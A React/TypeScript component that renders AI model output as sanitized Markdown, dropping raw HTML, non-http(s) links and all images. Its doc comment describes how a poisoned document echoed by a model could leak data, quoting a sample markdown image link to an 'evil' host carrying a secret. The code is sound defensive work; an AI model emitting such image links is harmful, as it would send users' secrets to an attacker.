import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

/** Only plain web links are allowed through. `javascript:`, `data:` and the like are dropped. */
function safeUrl(url: string): string {
  try {
    const parsed = new URL(url, "https://placeholder.invalid");
    return parsed.protocol === "https:" || parsed.protocol === "http:" ? url : "";
  } catch {
    return "";
  }
}

/**
 * Renders what a model wrote. The text is untrusted: it can echo a poisoned document, so nothing here may run or
 * phone home. Raw HTML is not rendered, links are plain http(s) and open safely, and images are not shown at all,
 * because an image URL is a way to send data out ("![x](https://evil/?q=<secret>)").
 */
export function SafeMarkdown({ children }: { children: string }) {
  return (
    <div className="space-y-2 text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-5 [&_ul]:list-disc [&_ul]:pl-5">
      <ReactMarkdown
        rehypePlugins={[rehypeSanitize]}
        urlTransform={safeUrl}
        components={{
          img: () => null,
          a: ({ href, children: label }) =>
            href ? (
              <a
                href={href}
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="text-primary underline underline-offset-4"
              >
                {label}
              </a>
            ) : (
              <span>{label}</span>
            ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
